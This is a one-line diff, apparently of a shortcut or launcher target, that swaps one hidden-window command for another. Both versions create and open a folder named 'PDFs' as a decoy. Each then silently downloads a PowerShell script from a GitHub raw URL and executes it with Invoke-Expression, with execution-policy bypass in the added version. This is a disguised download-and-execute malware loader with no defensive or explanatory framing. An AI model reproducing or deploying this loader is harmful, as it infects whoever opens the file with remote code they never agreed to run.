@@ -1,1 +1,1 @@
-"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -NonI -W Hidden -C "md PDFs -Force; explorer PDFs; (iwr https://raw.githubusercontent.com/H3221/2/main/u.ps1 -UseBasicParsing).Content | Invoke-Expression"
+"C:\Windows\System32\cmd.exe" /c "md PDFs -Force & explorer PDFs & powershell -w h -ep bypass -c (iwr https://raw.githubusercontent.com/H3221/2/main/u.ps1 -UseBasicParsing).Content|iex"
